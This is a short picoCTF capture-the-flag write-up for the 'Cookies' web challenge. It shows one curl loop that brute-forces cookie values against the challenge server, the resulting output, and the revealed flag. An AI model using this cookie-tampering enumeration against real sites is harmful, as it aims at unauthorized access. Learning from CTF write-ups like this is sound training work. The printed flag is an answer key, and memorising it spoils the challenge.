## Descripción:
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

Hints:
(None)

## Solución:
```
artacas-picoctf@webshell:~$ for i in {1..30}; do curl http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep 'picoCTF{'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1780  100  1780    0     0  75657      0 --:--:-- --:--:-- --:--:-- 77391
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1780  100  1780    0     0  67192      0 --:--:-- --:--:-- --:--:-- 68461
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1776  100  1776    0     0  76033      0 --:--:-- --:--:-- --:--:-- 77217
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1776  100  1776    0     0  68717      0 --:--:-- --:--:-- --:--:-- 71040
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1779  100  1779    0     0  77089      0 --:--:-- --:--:-- --:--:-- 80863
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1777  100  1777    0     0  76999      0 --:--:-- --:--:-- --:--:-- 80772
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1771  100  1771    0     0  60518      0 --:--:-- --:--:-- --:--:-- 61068
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0   132k      0 --:--:-- --:--:-- --:--:--  144k
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1770  100  1770    0     0  64534      0 --:--:-- --:--:-- --:--:-- 65555
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0  75553      0 --:--:-- --:--:-- --:--:-- 77130
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1772  100  1772    0     0  59790      0 --:--:-- --:--:-- --:--:-- 61103
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1772  100  1772    0     0  35227      0 --:--:-- --:--:-- --:--:-- 70880
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0  75194      0 --:--:-- --:--:-- --:--:-- 77130
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1770  100  1770    0     0  55302      0 --:--:-- --:--:-- --:--:-- 57096
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1776  100  1776    0     0  74549      0 --:--:-- --:--:-- --:--:-- 77217
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0  22764      0 --:--:-- --:--:-- --:--:-- 55437
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1771  100  1771    0     0  67877      0 --:--:-- --:--:-- --:--:-- 68115
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1184  100  1184    0     0  49670      0 --:--:-- --:--:-- --:--:-- 51478
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0  72693      0 --:--:-- --:--:-- --:--:-- 73916
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1773  100  1773    0     0  73835      0 --:--:-- --:--:-- --:--:-- 77086
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1773  100  1773    0     0  73125      0 --:--:-- --:--:-- --:--:-- 73875
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1772  100  1772    0     0  73259      0 --:--:-- --:--:-- --:--:-- 73833
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1777  100  1777    0     0  50732      0 --:--:-- --:--:-- --:--:-- 52264
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1772  100  1772    0     0  74604      0 --:--:-- --:--:-- --:--:-- 77043
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1775  100  1775    0     0   129k      0 --:--:-- --:--:-- --:--:--  133k
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1773  100  1773    0     0  73270      0 --:--:-- --:--:-- --:--:-- 73875
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1781  100  1781    0     0   122k      0 --:--:-- --:--:-- --:--:--  133k
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1791  100  1791    0     0  28595      0 --:--:-- --:--:-- --:--:-- 28887
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   209  100   209    0     0   8893      0 --:--:-- --:--:-- --:--:--  9086
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   209  100   209    0     0   8337      0 --:--:-- --:--:-- --:--:--  8708
artacas-picoctf@webshell:~$ 
```
